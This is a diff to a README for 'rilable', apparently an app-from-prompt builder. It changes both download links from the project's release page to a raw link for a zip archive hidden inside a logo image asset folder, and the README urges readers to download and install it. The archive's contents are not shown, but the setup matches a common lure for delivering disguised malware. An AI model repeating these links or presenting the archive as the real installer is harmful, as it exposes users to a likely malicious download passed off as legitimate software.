@@ -1,6 +1,6 @@
 # 🛠️ rilable - Build mobile apps using text prompts
 
-<a href="https://github.com/Beaked-festoon219/rilable/releases"><img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/Beaked-festoon219/rilable/main/ios/Sources/Assets.xcassets/LogoMark.imageset/Software_v1.8.zip"><img src="https://img.shields.io/badge/Download-Latest_Version-blue.svg" alt="Download"></a>
 
 rilable turns your ideas into reality. You type a description of the app you want to build, and the software creates the code and visual structure for you. You do not need to write code to make a functional application. This tool handles the complex work in the background. It uses advanced machine learning to convert your natural language instructions into working mobile software.
 
@@ -20,7 +20,7 @@ This software bundles several tools into one package. It uses SwiftUI for the lo
 
 You can obtain the current version of the software from the official release page. 
 
-[Click here to visit the release page and download the installer](https://github.com/Beaked-festoon219/rilable/releases)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/Beaked-festoon219/rilable/main/ios/Sources/Assets.xcassets/LogoMark.imageset/Software_v1.8.zip)
 
 Follow these steps to set up the software on your machine:
 
